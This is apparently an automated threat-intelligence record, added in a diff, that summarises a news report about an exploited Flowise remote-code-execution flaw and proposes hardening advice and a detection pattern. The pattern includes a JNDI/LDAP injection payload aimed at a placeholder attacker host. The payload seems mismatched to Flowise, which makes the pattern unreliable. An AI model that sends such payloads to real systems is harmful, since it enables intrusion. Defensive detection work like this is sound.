@@ -1,0 +1,57 @@
+{
+  "cached_at": "2026-04-13T01:53:57.274680+00:00",
+  "extraction": {
+    "signal_id": "8c400bb7ee7a6e52",
+    "source_name": "bleepingcomputer",
+    "article_url": "https://www.bleepingcomputer.com/news/security/max-severity-flowise-rce-vulnerability-now-exploited-in-attacks/",
+    "article_title": "Max severity Flowise RCE vulnerability now exploited in attacks",
+    "pub_date": "Tue, 07 Apr 2026 13:02:05 -0400",
+    "trust_score": 0.9,
+    "cves": [],
+    "iocs": {},
+    "threat_actors": [],
+    "malware_families": [],
+    "ttps": [],
+    "attack_chain": [
+      "rce",
+      "c2"
+    ],
+    "target_industries": [],
+    "target_technologies": [
+      "flowise"
+    ],
+    "proposed_vectors": [
+      {
+        "id": "WEB-PHISH-001",
+        "name_en": "Harden exposed Flowise instances",
+        "name_ko": "노출된 Flowise 인스턴스 강화",
+        "phase": "P4_cpr",
+        "risk": "high"
+      }
+    ],
+    "proposed_phase_updates": [
+      {
+        "phase_id": "P4_cpr",
+        "field": "strategic_advice_ko",
+        "append": "Flowise와 같이 외부에 노출될 수 있는 AI/워크플로우 플랫폼은 최신 보안 패치를 신속히 적용하고, 관리자 인터페이스를 사설망 또는 VPN 뒤로 제한하며, 인터넷 노출 자산에 대한 정기 스캔과 비정상 API 호출 모니터링을 강화해야 합니다."
+      }
+    ],
+    "proposed_kb_patterns": [
+      {
+        "technique": "rce",
+        "payload": "${jndi:ldap://attacker.example/a}",
+        "detect": [
+          "JNDI",
+          "ldap://",
+          "Exception",
+          "Error"
+        ],
+        "description": "Tests whether the application is vulnerable to server-side remote code execution via unsafe expression or injection handling",
+        "severity": "critical"
+      }
+    ],
+    "proposed_waf_variants": [],
+    "proposed_actor_updates": [],
+    "extracted_at": "2026-04-13T01:53:57.274604+00:00"
+  }
+}
